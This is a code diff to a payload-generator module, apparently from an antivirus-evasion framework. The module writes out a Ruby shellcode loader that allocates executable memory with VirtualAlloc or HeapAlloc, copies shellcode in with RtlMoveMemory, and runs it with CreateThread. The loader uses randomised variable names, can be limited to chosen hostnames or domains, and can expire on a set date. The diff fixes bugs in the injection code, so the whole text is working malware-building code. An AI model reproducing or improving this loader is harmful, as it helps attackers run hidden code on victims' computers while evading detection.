@@ -60,6 +60,9 @@ class PayloadModule:
         else:
             payload_code += "exit if Object.const_defined?(:Ocra)\n"
 
+        if self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X":
+            payload_code += 'require \'socket\'\n'
+
         if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
 
             year = date.today().year
@@ -75,7 +78,6 @@ class PayloadModule:
 
         if self.required_options["HOSTNAME"][0].lower() != "x":
 
-            payload_code += 'require \'socket\'\n'
             payload_code += 'hostname = Socket.gethostname.downcase\n'
             payload_code += 'if hostname[\"' + self.required_options["HOSTNAME"][0].lower() + '\"]\n'
 
@@ -84,7 +86,6 @@ class PayloadModule:
 
         if self.required_options["DOMAIN"][0].lower() != "x":
 
-            payload_code += 'require \'socket\'\n'
             payload_code += 'domain = Socket.gethostname.downcase\n'
             payload_code += 'if domain[\"' + self.required_options["DOMAIN"][0].lower() + '\"]\n'
 
@@ -111,9 +112,9 @@ class PayloadModule:
         heapalloc_random = evasion_helpers.randomString()
 
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
-            payload_code += valloc_random + " = API.new('VirtualAlloc', 'IIII', 'I');" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"
+            payload_code += "$" + valloc_random + " = API.new('VirtualAlloc', 'IIII', 'I');$" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');$" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');$" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
-            payload_code += heapcreate_random + " = API.new('HeapCreate', 'III', 'I');" + heapalloc_random + " = API.new('HeapAlloc', 'III', 'I');" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"
+            payload_code += "$" + heapcreate_random + " = API.new('HeapCreate', 'III', 'I');$" + heapalloc_random + " = API.new('HeapAlloc', 'III', 'I');$" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');$" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');$" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"
 
         payload_code += "def ch()\n"
         #payload_code += "\tchk = (\"a\"..\"z\").to_a + (\"A\"..\"Z\").to_a + (\"0\"..\"9\").to_a\n"
@@ -130,13 +131,14 @@ class PayloadModule:
         payload_code += "\tif sc.length > 1000\n"
 
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
-            payload_code += "\t\tpt = " + valloc_random + ".call(0,(sc.length > 0x1000 ? sc.length : 0x1000), 0x1000, 0x40)\n"
-            payload_code += "\t\tx = " + rtlmove_random + ".call(pt,sc,sc.length)\n"
-            payload_code += "\t\tx = " + waitfor_random + ".call(" + createthread_random + ".call(0,0,pt,0,0,0),0xFFFFFFF)\n"
+            payload_code += "\t\tpt = $" + valloc_random + ".call(0,(sc.length > 0x1000 ? sc.length : 0x1000), 0x1000, 0x40)\n"
+            payload_code += "\t\tx = $" + rtlmove_random + ".call(pt,sc,sc.length)\n"
+            payload_code += "\t\tx = $" + waitfor_random + ".call($" + createthread_random + ".call(0,0,pt,0,0,0),0xFFFFFFF)\n"
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
-            payload_code += heap_name + " = " + heapcreate_random + ".call(0x0004,(sc.length > 0x1000 ? sc.length : 0x1000), 0)\n"
-            payload_code += ptrName + " = " + heapalloc_random + ".call(" + heap_name + ", 0x00000008, sc.length)\n"
-            payload_code += "x = " + rtlmove_random + ".call(" + ptrName + ",sc,sc.length); " + threadName + " = " + createthread_random + ".call(0,0," + ptrName + ",0,0,0); x = " + waitfor_random + ".call(" + threadName + ",86400)\n"
+            payload_code += "\t\t$" + heap_name + " = $" + heapcreate_random + ".call(0x0004,(sc.length > 0x1000 ? sc.length : 0x1000), 0)\n"
+            payload_code += "\t\t$" + ptrName + " = $" + heapalloc_random + ".call($" + heap_name + ", 0x00000008, sc.length)\n"
+            payload_code += "\t\tx = $" + rtlmove_random + ".call($" + ptrName + ",sc,sc.length)\n"
+            payload_code += "\t\tx = $" + waitfor_random + ".call($" + createthread_random + ".call(0,0,$" + ptrName + ",0,0,0),0xFFFFFFF)\n"
 
         payload_code += "\tend\nend\n"
 
